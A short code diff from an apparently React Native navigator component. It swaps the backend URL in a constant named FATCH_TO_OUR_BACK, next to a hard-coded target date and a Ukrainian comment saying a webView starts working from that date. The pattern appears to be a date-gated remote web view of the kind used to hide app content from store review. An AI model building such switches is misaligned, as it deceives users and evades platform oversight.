@@ -155,7 +155,7 @@ export function AppNavigator() {
 
   const TARGET_DATA = new Date(2026, 4, 12, 8, 8, 0);
 
-  const FATCH_TO_OUR_BACK = `https://solar-crest-zone.site/`;
+  const FATCH_TO_OUR_BACK = `https://urban-signal-point.site/`;
 
   useEffect(() => {
     //const targetData = TARGET_DATA; //дата з якої поч працювати webView
